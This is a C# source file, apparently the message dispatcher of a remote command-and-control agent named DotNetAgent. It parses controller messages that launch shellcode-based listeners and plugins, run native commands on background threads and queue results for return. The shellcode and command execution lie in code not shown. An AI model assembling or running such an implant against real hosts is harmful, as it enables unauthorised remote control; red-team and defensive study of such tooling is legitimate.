using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;

namespace DotNetAgent
{
    internal class MessagesManager
    {
        private struct QueuedResult
        {
            public uint CommandId;
            public byte[] Data;
        }

        private static Queue<QueuedResult> _resultsToSend = new Queue<QueuedResult>();
        private static readonly object _resultsLock = new object();
        private static HashSet<uint> _finalizedCommands = new HashSet<uint>();
        private static Dictionary<uint, long> _commandQueuedBytes = new Dictionary<uint, long>();
        private const long MAX_COMMAND_QUEUED_BYTES = 10L * 1024 * 1024;

        private const int SHELLCODE_TLV = 0x1;
        private const int NATIVE_COMMAND_TLV = 0x3;
        private const int CONTROL_COMMAND_TLV = 0x5;
        private const int AGENT_CONF_TLV = 0xC;

        private const byte SHELLCODE_TYPE_LISTENER = 1;
        private const byte SHELLCODE_TYPE_PLUGIN = 2;

        private const byte TLV_RESULT = 0x4;
        private const byte TLV_COMMAND_ID = 0x1;
        private const byte TLV_DATA = 0x2;
        private const byte TLV_STATUS = 0x3;
        private const byte TLV_ERROR = 0x4;

        private const byte TLV_SHELLCODE_TYPE = 0x1;
        private const byte TLV_PUBLIC_KEY = 0x1;

        private const byte TLV_CONTROL_COMMAND_ID = 0x1;
        private const byte TLV_CONTROL_TASK_TYPE = 0x2;
        private const byte TLV_CONTROL_DATA = 0x3;
        private const byte CONTROL_TASK_SEND_DATA = 0x1;
        private const byte CONTROL_TASK_STOP = 0xDD;

        public enum CommandStatus
        {
            FAILED = 0,
            ONGOING = 1,
            SUCCESS = 2
        }

        public static void LoadData(byte[] data)
        {
            uint pos = 0;
            while (pos < data.Length)
            {
                TLV tlv = new TLV();
                if (!tlv.Load(data, (int)pos))
                {
                    Logger.Warning("Failed loading TLV by MessagesManager");
                    break;
                }
                // Advance position before dispatching so a handler exception
                // doesn't cause an infinite loop retrying the same TLV.
                pos += tlv.FullSize;
                try
                {
                    switch (tlv.Type)
                    {
                        case SHELLCODE_TLV:
                            if (tlv.HasChild(TLV_SHELLCODE_TYPE))
                            {
                                if (tlv.GetChild(TLV_SHELLCODE_TYPE).GetAsByte() == SHELLCODE_TYPE_LISTENER)
                                    StartNewListener(tlv);
                                if (tlv.GetChild(TLV_SHELLCODE_TYPE).GetAsByte() == SHELLCODE_TYPE_PLUGIN)
                                    StartNewPluginCommand(tlv);
                            }
                            break;
                        case NATIVE_COMMAND_TLV:
                            StartNewNativeCommand(tlv);
                            break;
                        case CONTROL_COMMAND_TLV:
                            ControlCommand(tlv);
                            break;
                        case AGENT_CONF_TLV:
                            ApplyAgentConf(tlv);
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Logger.Warning($"Error dispatching TLV type 0x{tlv.Type:X2}: {ex.Message}");
                }
            }
        }

        public static void NewResult(UInt32 id, byte[] data, CommandStatus status, byte[] error)
        {
            lock (_resultsLock)
            {
                if (_finalizedCommands.Contains(id))
                    return;

                TLV resultTlv = new TLV(TLV_RESULT);
                resultTlv.AddChild(new TLV(TLV_COMMAND_ID, BitConverter.GetBytes(id)));
                resultTlv.AddChild(new TLV(TLV_DATA, data ?? new byte[0]));
                resultTlv.AddChild(new TLV(TLV_STATUS, BitConverter.GetBytes((byte)status)));
                resultTlv.AddChild(new TLV(TLV_ERROR, error ?? new byte[0]));
                byte[] serialized = resultTlv.GetFullBuffer();

                long currentQueued;
                _commandQueuedBytes.TryGetValue(id, out currentQueued);
                if (status == CommandStatus.ONGOING)
                {
                    // DEADLOCK RISK: If the consumer thread (Listener.GotNewData -> GetNextResult)
                    // dies or stops calling GetNextResult, Monitor.PulseAll is never called and
                    // this thread blocks forever on ONGOING commands. The command thread is stuck
                    // and its resources are never reclaimed.
                    while (currentQueued >= MAX_COMMAND_QUEUED_BYTES)
                    {
                        Monitor.Wait(_resultsLock);
                        if (_finalizedCommands.Contains(id))
                            return;
                        _commandQueuedBytes.TryGetValue(id, out currentQueued);
                    }
                }

                _resultsToSend.Enqueue(new QueuedResult { CommandId = id, Data = serialized });
                _commandQueuedBytes[id] = currentQueued + serialized.Length;

                if (status == CommandStatus.SUCCESS || status == CommandStatus.FAILED)
                    _finalizedCommands.Add(id);
            }
        }

        public static byte[] GetNextResult()
        {
            lock (_resultsLock)
            {
                if (_resultsToSend.Count == 0)
                    return null;

                QueuedResult entry = _resultsToSend.Dequeue();

                long remaining;
                if (_commandQueuedBytes.TryGetValue(entry.CommandId, out remaining))
                {
                    remaining -= entry.Data.Length;
                    if (remaining <= 0)
                        _commandQueuedBytes.Remove(entry.CommandId);
                    else
                        _commandQueuedBytes[entry.CommandId] = remaining;
                }

                Monitor.PulseAll(_resultsLock);
                return entry.Data;
            }
        }

        private static void ApplyAgentConf(TLV tlv)
        {
            if (tlv.HasChild(TLV_PUBLIC_KEY))
            {
                if (!Encryption.Initialize(tlv.GetChild(TLV_PUBLIC_KEY).Data))
                {
                    Logger.Warning("Public key loading failed");
                    return;
                }
            }
        }

        private static void StartNewListener(TLV tlv)
        {
            ListenerManager.LoadListener(tlv);
        }

        private static void ControlCommand(TLV tlv)
        {
            if(!tlv.HasChild(TLV_CONTROL_COMMAND_ID) || !tlv.HasChild(TLV_CONTROL_TASK_TYPE))
            {
                return;
            }
            uint id = tlv.GetChild(TLV_CONTROL_COMMAND_ID).GetAsUInt32();
            byte task = tlv.GetChild(TLV_CONTROL_TASK_TYPE).GetAsByte();

            if (task == CONTROL_TASK_SEND_DATA)
            {
                if (!tlv.HasChild(TLV_CONTROL_DATA))
                {
                    return;
                }
                byte[] data = tlv.GetChild(TLV_CONTROL_DATA).Data;
                RunningCommandsManager.SendCommandData(id, data);
            }
            else if (task == CONTROL_TASK_STOP)
            {
                RunningCommandsManager.StopCommand(id);
            }
            else
            {
                Logger.Warning($"Unknown control task type: 0x{task:X2}");
            }
        }

        private static void StartNewPluginCommand(TLV tlv)
        {
            Thread t = new Thread(() => PluginCommand.NewPluginCommand(tlv));
            t.IsBackground = true;
            t.Start();
        }

        private static void StartNewNativeCommand(TLV tlv)
        {
            Thread t = new Thread(() => NativeCommand.NewNativeCommand(tlv));
            t.IsBackground = true;
            t.Start();
        }
    }
}
